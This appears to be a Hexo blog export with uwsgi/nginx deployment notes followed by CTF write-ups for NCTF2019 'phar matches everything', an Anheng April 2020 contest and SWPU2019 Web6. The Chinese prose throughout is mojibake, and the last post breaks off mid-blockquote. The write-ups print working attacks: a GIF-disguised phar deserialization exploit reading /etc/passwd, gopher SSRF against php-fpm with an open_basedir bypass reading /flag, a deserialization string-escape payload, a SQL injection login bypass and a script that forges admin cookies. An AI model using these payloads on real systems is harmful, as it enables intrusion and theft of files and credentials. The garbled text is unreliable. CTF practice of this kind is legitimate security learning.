<h3 id="å¯åœuwsgi"><a href="#å¯åœuwsgi" class="headerlink" title="å¯åœuwsgi"></a>å¯åœuwsgi</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># è™šæ‹Ÿç¯å¢ƒè¿è¡Œ</span><br><span class="line"># å¯åŠ¨</span><br><span class="line">uwsgi --ini uwsgi.ini             </span><br><span class="line"># é‡å¯</span><br><span class="line">uwsgi --reload uwsgi.pid          </span><br><span class="line"># å…³é—­</span><br><span class="line">uwsgi --stop uwsgi.pid</span><br></pre></td></tr></table></figure>
<h3 id="æœåŠ¡ç›‘æ§"><a href="#æœåŠ¡ç›‘æ§" class="headerlink" title="æœåŠ¡ç›‘æ§"></a>æœåŠ¡ç›‘æ§</h3><ul>
<li>è¯»å–uwsgiå®æ—¶çŠ¶æ€,jsonå­—ç¬¦ä¸²å½¢å¼</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># è™šæ‹Ÿç¯å¢ƒè¿è¡Œ</span><br><span class="line">uwsgi --connect-and-read uwsgi&#x2F;uwsgi.status</span><br></pre></td></tr></table></figure>
<ul>
<li>uwsgitop</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># è™šæ‹Ÿç¯å¢ƒè¿è¡Œ</span><br><span class="line">uwsgitop uwsgi&#x2F;uwsgi.status</span><br></pre></td></tr></table></figure>
<h3 id="é€€å‡ºè™šæ‹Ÿç¯å¢ƒ"><a href="#é€€å‡ºè™šæ‹Ÿç¯å¢ƒ" class="headerlink" title="é€€å‡ºè™šæ‹Ÿç¯å¢ƒ"></a>é€€å‡ºè™šæ‹Ÿç¯å¢ƒ</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>
<h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>ç¼–è¯‘å®‰è£…æˆ–è€…ç”¨åŒ…ç®¡ç†å®‰è£…éƒ½æ˜¯å¯ä»¥çš„ï¼Œæ»¡è¶³é¡¹ç›®éœ€æ±‚å°±å¯ä»¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install nginx</span><br></pre></td></tr></table></figure>
<p>é…ç½®æ–‡ä»¶ç›®å½•ï¼š<code>/etc/nginx</code></p>
<p>é…ç½®æ–‡ä»¶: <code>/etc/nginx/nginx.conf</code></p>
<p>ç«™ç‚¹æ–‡ä»¶æºæ–‡ä»¶ï¼š<code>/etc/nginx/sites-available</code></p>
<p>ç«™ç‚¹æ–‡ä»¶æ¿€æ´»æ–‡ä»¶å¤¹ï¼š<code>/etc/nginx/sites-enabled</code></p>
<p><strong>è¯´æ˜ï¼š</strong></p>
<ul>
<li>centos yumå®‰è£…çš„nginxæ˜¯æ²¡ç”¨ä¸‹é¢ä¿©ä¸ªç«™ç‚¹ç›®å½•çš„ï¼Œæ‰‹åŠ¨åˆ›å»ºï¼Œç„¶ååœ¨<code>nginx.conf</code>ä¸­include<code>/etc/nginx/sites-enabled/*</code></li>
<li>å°†ç«™ç‚¹æ–‡ä»¶æºæ–‡ä»¶å†™åœ¨<code>sites-available</code>ç›®å½•ï¼Œæ·»åŠ è½¯é“¾æ¥åˆ°<code>sites-enabled</code>ï¼Œå¦‚è‹¥è¦å…³é—­ç«™ç‚¹ï¼Œåªéœ€è¦å°† <code>sites-enabled</code>ç›®å½•ä¸‹çš„è½¯é“¾æ¥åˆ é™¤å³å¯</li>
</ul>
<p>æ—¥å¿—ç›®å½•ï¼š<code>/var/log/nginx/</code></p>
<h3 id="é…ç½®ç«™ç‚¹"><a href="#é…ç½®ç«™ç‚¹" class="headerlink" title="é…ç½®ç«™ç‚¹"></a>é…ç½®ç«™ç‚¹</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;</span><br><span class="line">sudo vim é¡¹ç›®åç§°.conf</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">	# æœ‰åŸŸåå°±é…ç½®server_nameä¸ºåŸŸå,ç«¯å£ç›‘å¬80</span><br><span class="line">    # ç›‘å¬ç«¯å£</span><br><span class="line">    listen 5001;</span><br><span class="line">    server_name  localhost;</span><br><span class="line">    </span><br><span class="line">    access_log &#x2F;var&#x2F;log&#x2F;project_name&#x2F;project_name_access.log;</span><br><span class="line">    error_log &#x2F;var&#x2F;log&#x2F;project_name&#x2F;project_name_error.log</span><br><span class="line">    </span><br><span class="line">    index index.html; </span><br><span class="line">    #åŠ¨æ€è¯·æ±‚</span><br><span class="line">    location &#x2F; &#123;</span><br><span class="line">         include uwsgi_params;</span><br><span class="line">	 uwsgi_pass unix:&#x2F;&#x2F;&#x2F;home&#x2F;project&#x2F;é¡¹ç›®åç§°&#x2F;uwsgi&#x2F;uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#åˆ›å»ºè½¯é“¾æ¥</span><br><span class="line">sudo ln -s &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;é¡¹ç›®åç§°.conf &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;é¡¹ç›®åç§°.conf</span><br><span class="line"></span><br><span class="line">#æ£€éªŒé…ç½®æ–‡ä»¶</span><br><span class="line">sudo nginx -t</span><br><span class="line">sudo systemctl restart nginx.service</span><br></pre></td></tr></table></figure>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>è®¿é—®ç«™ç‚¹æ˜¯å¦å¯ä»¥è®¿é—®</p>
<h3 id="æ’æŸ¥é—®é¢˜å‚è€ƒ"><a href="#æ’æŸ¥é—®é¢˜å‚è€ƒ" class="headerlink" title="æ’æŸ¥é—®é¢˜å‚è€ƒ"></a>æ’æŸ¥é—®é¢˜å‚è€ƒ</h3><ul>
<li>äº‘æœåŠ¡å™¨ç¡®è®¤ç«¯å£æ˜¯å¦å¼€å¯å¯è®¿é—®</li>
<li>æœåŠ¡å™¨æœ¬åœ°æ˜¯å¦å¯è®¿é—®<ul>
<li><code>curl http://127.0.0.1:port</code></li>
<li>æœ‰å“åº”æ£€æŸ¥æœåŠ¡å™¨ç«¯å£ï¼Œæ— å“åº”æ£€æŸ¥nginx</li>
</ul>
</li>
<li>ipï¼športæ˜¯å¦å¯è®¿é—®<ul>
<li>æœ‰å“åº”ï¼Œä½†æ˜¯åªæ˜¯å‡ºç°nginxï¼Œæ£€æŸ¥uwsgi</li>
<li>æ— å“åº”ï¼Œæ£€æŸ¥æœåŠ¡å™¨ç«¯å£ï¼Œç„¶åå†æ£€æŸ¥nginx</li>
</ul>
</li>
<li>æ³¨æ„æƒé™é—®é¢˜å¼•å‘çš„æ—¥å¿—æˆ–è€…ç¨‹åºæ‹’ç»æœåŠ¡500ç­‰é”™è¯¯ç </li>
</ul>
]]></content>
      <categories>
        <category>Note</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>python</tag>
        <tag>flask</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>[NCTF2019]phar matches everything</title>
    <url>/2020/05/02/CTF_WP/%5BNCTF2019%5Dphar%20matches%20everything/</url>
    <content><![CDATA[<h1 id="NCTF2019-phar-matches-everything"><a href="#NCTF2019-phar-matches-everything" class="headerlink" title="[NCTF2019]phar matches everything"></a>[NCTF2019]phar matches everything</h1><a id="more"></a>

<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p><strong>æºç </strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Easytest&#123;</span><br><span class="line">    protected $test;</span><br><span class="line">    public function funny_get()&#123;</span><br><span class="line">        return $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Main &#123;</span><br><span class="line">    public $url;</span><br><span class="line">    public function curl($url)&#123;</span><br><span class="line">        $ch &#x3D; curl_init();  </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);</span><br><span class="line">        $output&#x3D;curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line">public function __destruct()&#123;</span><br><span class="line">        $this_is_a_easy_test&#x3D;unserialize($_GET[&#39;careful&#39;]);</span><br><span class="line">        if($this_is_a_easy_test-&gt;funny_get() &#x3D;&#x3D;&#x3D; &#39;1&#39;)&#123;</span><br><span class="line">            echo $this-&gt;curl($this-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&quot;submit&quot;])) &#123;</span><br><span class="line">    $check &#x3D; getimagesize($_POST[&#39;name&#39;]);</span><br><span class="line">    if($check !&#x3D;&#x3D; false) &#123;</span><br><span class="line">        echo &quot;File is an image - &quot; . $check[&quot;mime&quot;] . &quot;.&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;File is not an image.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="ä¸¤æ¬¡åºåˆ—åŒ–"><a href="#ä¸¤æ¬¡åºåˆ—åŒ–" class="headerlink" title="ä¸¤æ¬¡åºåˆ—åŒ–"></a>ä¸¤æ¬¡åºåˆ—åŒ–</h3><p>ç¬¬ä¸€ä¸ªæ˜¯åˆ©ç”¨<code>getimagesize($file_path)</code>è§¦å‘<code>phar</code>ååºåˆ—åŒ–ï¼Œè§¦å‘çš„ååºåˆ—åŒ–å½±å“Mainç±»</p>
<p>ç¬¬äºŒä¸ªå¾ˆç®€å•,è¦æ˜¯<code>Easytest</code>ä¸­çš„<code>test=1</code></p>
<p>åˆ©ç”¨<code>curl</code>è¯»å–æ–‡ä»¶</p>
<p><strong>exp.php</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Easytest &#123;</span><br><span class="line">	protected $test &#x3D; &#39;1&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Main &#123;</span><br><span class="line">	public $url &#x3D;&#39;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new Easytest();</span><br><span class="line">echo serialize($a);</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">$b &#x3D; new Main();</span><br><span class="line">@unlink(&quot;exp.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&#39;GIF89a&#39; . &quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($b);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(&#39;exp.char&#39;, &quot;exp.gif&quot;);</span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆä¸Šä¼ <code>exp.gif</code></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/6dYAPUL1PxQC.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/6dYAPUL1PxQC.png?imageslim" alt="mark"></a></p>
<p>ç„¶ååˆ©ç”¨<code>catchmime.php</code>ä¼ å‚è§¦å‘ååºåˆ—åŒ–</p>
<p><code>careful</code>ç”¨æ¥è§¦å‘2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#96;ç”¨æ¥è§¦å‘&#96;phar</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/IvRGNO5gryyM.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/IvRGNO5gryyM.png?imageslim" alt="mark"></a></p>
<p>æ”¹å˜<code>url</code>è¯»å–hosts,å› ä¸ºè¿™é“é¢˜æƒ³è®©æˆ‘ä»¬æ‰“å†…ç½‘</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/ARLi3vvvsEdD.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/ARLi3vvvsEdD.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/ctjN6Nkrlpv9.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/ctjN6Nkrlpv9.png?imageslim" alt="mark"></a></p>
<p>æˆ‘è¯»å–åˆ°äº†<code>173.187.197.10</code>,å†ç”¨httpåè®®è¯»ä¸€ä¸‹<code>http://173.187.197.10</code>,å‘ç°å°±æ˜¯å½“å‰é¡µé¢,å†è¯»ä¸€ä¸‹ <code>http://173.187.197.11</code></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/wgylUttLBoAT.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/wgylUttLBoAT.png?imageslim" alt="mark"></a></p>
<h3 id="php-fpmæœªæˆæƒæ¼æ´"><a href="#php-fpmæœªæˆæƒæ¼æ´" class="headerlink" title="php-fpmæœªæˆæƒæ¼æ´"></a>php-fpmæœªæˆæƒæ¼æ´</h3><p><a href="https://evoa.me/index.php/archives/52/#toc-SSRFGopher">php-fpmæœªæˆæƒæ¼æ´</a></p>
<p>ä½¿ç”¨é“¾æ¥ä¸­çš„<code>exp</code></p>
<p>å†ä½¿ç”¨<code>gopher</code>åè®®ä½¿ç”¨expç”Ÿæˆçš„<code>payload</code></p>
<p>å…ˆæ‰“<code>phpinfo();</code>å¯ä»¥å¾—çŸ¥éœ€è¦ç»•è¿‡<code>open_basedir</code></p>
<p>åŠ ä¸Šç»•è¿‡<code>open_basedir</code>çš„payloadå°±å¯ä»¥äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt;</span><br></pre></td></tr></table></figure>
<p>flagåœ¨æ ¹ç›®å½•</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/MkFvqjnF23zV.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/MkFvqjnF23zV.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/cCKxtrWK4nWi.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/cCKxtrWK4nWi.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200502/VDMHTyd45wxR.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200502/VDMHTyd45wxR.png?imageslim" alt="mark"></a></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[<a href="https://guokeya.github.io/post/1byvbzb_I/">NCTF2019]phar matches everything(pharååºåˆ—åŒ–)</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PHP</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>WP</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>å®‰æ’2020å››æœˆèµ›</title>
    <url>/2020/04/25/CTF_WP/%E5%AE%89%E6%81%922020%E5%9B%9B%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="å®‰æ’2020å››æœˆèµ›"><a href="#å®‰æ’2020å››æœˆèµ›" class="headerlink" title="å®‰æ’2020å››æœˆèµ›"></a>å®‰æ’2020å››æœˆèµ›</h1><p>åªä¼šåšåšç®€å•é¢˜æ··æ··åˆ†ğŸ˜¢</p>
<a id="more"></a>

<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line">function write ($data) &#123;</span><br><span class="line">	return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read ($data) &#123;</span><br><span class="line">	return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">	public $username;</span><br><span class="line">	public $password;</span><br><span class="line"></span><br><span class="line">	function __construct ($a, $b) &#123;</span><br><span class="line">		$this-&gt;username &#x3D; $a;</span><br><span class="line">		$this-&gt;password &#x3D; $b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B &#123;</span><br><span class="line">	public $b &#x3D;&quot;gpy&quot;;</span><br><span class="line">	function __destruct () &#123;</span><br><span class="line">		$c &#x3D; &#39;a&#39; . $this-&gt;b;</span><br><span class="line">		echo $c;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C &#123;</span><br><span class="line">	public $c;</span><br><span class="line"></span><br><span class="line">	function __toString () &#123;</span><br><span class="line">		&#x2F;&#x2F;flag.php</span><br><span class="line">		echo file_get_contents($this-&gt;c);</span><br><span class="line">		return &#39;nice&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);</span><br><span class="line">$b &#x3D; unserialize(read(write(serialize($a))));</span><br><span class="line">function read ($data) &#123;</span><br><span class="line">	return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>readå‡½æ•°å°†<code>chr(0) . &#39;*&#39; . chr(0)</code>å˜ä¸º<code>\0\0\0</code>,ä½†æ˜¯å‰è€…åªæœ‰ä¸‰ä¸ªå­—ç¬¦,åè€…æœ‰å…­ä¸ªå­—ç¬¦,é‚£ä¹ˆå°±ä¼šå¯¼è‡´å­—ç¬¦é€ƒé€¸ã€‚</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b&#x3D;;s:&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="6Gç­¾åˆ°"><a href="#6Gç­¾åˆ°" class="headerlink" title="6Gç­¾åˆ°"></a>6Gç­¾åˆ°</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl --range 0-100 http:&#x2F;&#x2F;balabala&#x2F;1Gfile.file</span><br></pre></td></tr></table></figure>
<h3 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h3><p>ä¸‹è½½æ˜¯ä¸ªæµé‡åŒ…</p>
<p>ç®€å•æµè§ˆä¸€ä¸‹ï¼Œæ˜¯è“ç‰™çš„æµé‡ã€‚</p>
<p>å…ˆæŒ‰åè®®æ’ä¸€ä¸‹åº</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200425/GegNB3OYmHCW.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200425/GegNB3OYmHCW.png?imageslim" alt="mark"></a></p>
<p>æ‰¾è“ç‰™çš„ä¼ è¾“åè®®OBEX</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200425/UgRLRbitaEmw.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200425/UgRLRbitaEmw.png?imageslim" alt="mark"></a></p>
<p>æŠŠ7zå‹ç¼©åŒ…çš„æ•°æ®å—å¤åˆ¶å‡ºæ¥ï¼Œç”¨winhexæˆ–è€…010editorä¿å­˜æˆ7zæ–‡ä»¶ï¼Œè§£å‹ï¼Œè¦PIN</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200425/0LBErJCiGVVb.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200425/0LBErJCiGVVb.png?imageslim" alt="mark"></a></p>
<p>å»æ‰è¿‡æ»¤å™¨ï¼Œ<code>ctrl+f</code>æŸ¥æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰PINï¼Œå‘ç°æœ‰çš„ï¼Œè§£å‹å¾—åˆ°flag</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200425/PrkpItBPzngw.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200425/PrkpItBPzngw.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200425/iWTFkcKX62gx.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200425/iWTFkcKX62gx.png?imageslim" alt="mark"></a></p>
<p><strong>å¥½å¥½å­¦ä¹ ï¼Œå¤©å¤©å‘ä¸Š</strong></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WP</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>[SWPU2019]Web6</title>
    <url>/2020/04/18/CTF_WP/SWPU2019Web6/</url>
    <content><![CDATA[<h1 id="SWPU2019-Web6"><a href="#SWPU2019-Web6" class="headerlink" title="[SWPU2019]Web6"></a>[SWPU2019]Web6</h1><h2 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2><h3 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h3><p>éªŒè¯æœºåˆ¶æ˜¯ç”¨æˆ·åå’Œå¯†ç åˆ†å¼€å•ç‹¬éªŒè¯ï¼Œå¹¶ä¸”æ²¡æœ‰æ£€æŸ¥ç©ºå¯†ç </p>
<a id="more"></a>

<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;1&#39; or &#39;1&#39;&#x3D;&#39;1&#39; group by passwd with rollup having passwd is NULL#&amp;passwd&#x3D;</span><br></pre></td></tr></table></figure>
<p>æŸ¥å‡ºæ¥ä¸€ä¸ªç”¨æˆ·å¹¶ä¸”å¯†ç ä¸ºç©ºï¼Œæ­£å¥½å¯ä»¥å’Œ<code>passwd</code>æ²¡æœ‰ä¼ å€¼æ˜¯<code>NULL</code>ç›¸åŒ¹é…</p>
<h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><p>å†™è„šæœ¬æ³¨å…¥ï¼Œå‚è€ƒ</p>
<p><a href="https://lihuaiqiu.github.io/2019/12/11/SWPU2019-Web%E9%A2%98%E8%A7%A3/">SWPU2019-Webé¢˜è§£</a></p>
<h2 id="ä¼ªé€ admin"><a href="#ä¼ªé€ admin" class="headerlink" title="ä¼ªé€ admin"></a>ä¼ªé€ admin</h2><p>ç™»é™†ä¸ŠåæŸ¥çœ‹cookieï¼Œç„¶åæŸ¥çœ‹wsdl.php</p>
<p>è°ƒç”¨<code>get_flag</code>æç¤º</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200418/fdGAYirSXJ7M.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200418/fdGAYirSXJ7M.png?imageslim" alt="mark"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200418/XJgGyei1gNVM.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200418/XJgGyei1gNVM.png?imageslim" alt="mark"></a></p>
<p>æ‰¾åˆ°è¯»å–æ–‡ä»¶çš„æ–¹æ³•ï¼Œè¿˜æœ‰ä¸€ä¸ªhintï¼Œäºæ˜¯ä¾æ¬¡è¯»å–index.phpï¼Œencode.phpï¼Œinterface.phpï¼Œse.php keyaaaaaaaasdfsaf.txt</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200418/qgqd9WsM8elM.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200418/qgqd9WsM8elM.png?imageslim" alt="mark"></a></p>
<p>ï¼ˆä¸çŸ¥ä¸ºä½•Chromeçš„HackbarPOSTä¸ç®¡ç”¨ï¼‰</p>
<p>encode.phpæ˜¯å¯¹cookiesçš„åŠ å¯†ï¼Œ<code>user=</code>åé¢çš„å­—ç¬¦ä¸²ä¸ºåŠ å¯†åçš„å†…å®¹</p>
<p>å†™å‡ºè§£å¯†è„šæœ¬ï¼Œç„¶åä¼ªé€ æˆadminï¼Œkeyä¸ºtxtä¸­çš„å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function decrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">	$key &#x3D; md5($key);</span><br><span class="line">	$x &#x3D; 0;</span><br><span class="line">	$data &#x3D; base64_decode($data);</span><br><span class="line">	$len &#x3D; strlen($data);</span><br><span class="line">	$l &#x3D; strlen($key);</span><br><span class="line">	$char &#x3D; &#39;&#39;;</span><br><span class="line">	for ($i &#x3D; 0; $i &lt; $len; $i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if ($x &#x3D;&#x3D; $l)</span><br><span class="line">		&#123;</span><br><span class="line">			$x &#x3D; 0;</span><br><span class="line">		&#125;</span><br><span class="line">		$char .&#x3D; substr($key, $x, 1);</span><br><span class="line">		$x++;</span><br><span class="line">	&#125;</span><br><span class="line">	$str &#x3D; &#39;&#39;;</span><br><span class="line">	for ($i &#x3D; 0; $i &lt; $len; $i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if (ord(substr($data, $i, 1)) &lt; ord(substr($char, $i, 1)))</span><br><span class="line">		&#123;</span><br><span class="line">			$str .&#x3D; chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			$str .&#x3D; chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return $str;</span><br><span class="line">&#125;</span><br><span class="line">function en_crypt($content,$key)&#123;</span><br><span class="line">	$key    &#x3D;    md5($key);</span><br><span class="line">	$h      &#x3D;    0;</span><br><span class="line">	$length    &#x3D;    strlen($content);</span><br><span class="line">	$swpuctf      &#x3D;    strlen($key);</span><br><span class="line">	$varch   &#x3D;    &#39;&#39;;</span><br><span class="line">	for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">	&#123;</span><br><span class="line">		if ($h &#x3D;&#x3D; $swpuctf)</span><br><span class="line">		&#123;</span><br><span class="line">			$h &#x3D; 0;</span><br><span class="line">		&#125;</span><br><span class="line">		$varch .&#x3D; $key&#123;$h&#125;;</span><br><span class="line"></span><br><span class="line">		$h++;</span><br><span class="line">	&#125;</span><br><span class="line">	$swpu  &#x3D;  &#39;&#39;;</span><br><span class="line"></span><br><span class="line">	for ($j &#x3D; 0; $j &lt; $length; $j++)</span><br><span class="line">	&#123;</span><br><span class="line">		$swpu .&#x3D; chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % 256);</span><br><span class="line">	&#125;</span><br><span class="line">	return base64_encode($swpu);</span><br><span class="line">&#125;</span><br><span class="line">$key&#x3D;&quot;flag&#123;this_is_false_flag&#125;&quot;;</span><br><span class="line">$data&#x3D;&quot;3J6Roahxag&#x3D;&#x3D;&quot;;</span><br><span class="line">echo decrypt($data,$key);</span><br><span class="line">$admin&#x3D;&quot;admin:1&quot;;</span><br><span class="line">echo en_crypt($admin,$key);</span><br></pre></td></tr></table></figure>
<p>æ”¹cookieåå˜æˆwelcome adminï¼ŒæˆåŠŸä¼ªé€ æˆadmin</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>å› ä¸ºè¦127.0.0.1,å¾ˆå®¹æ˜“è”æƒ³åˆ°SSRF</p>
<p>åœ¨se.phpä¸­å­˜åœ¨å…³é”®ä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br></pre></td></tr></table></figure>
<p>äºæ˜¯æƒ³åˆ°sessionååºåˆ—åŒ–,åˆè¦ssrf,æƒ³åˆ°åˆ©ç”¨Soapè¿›è¡ŒSSRF</p>
<blockquote>
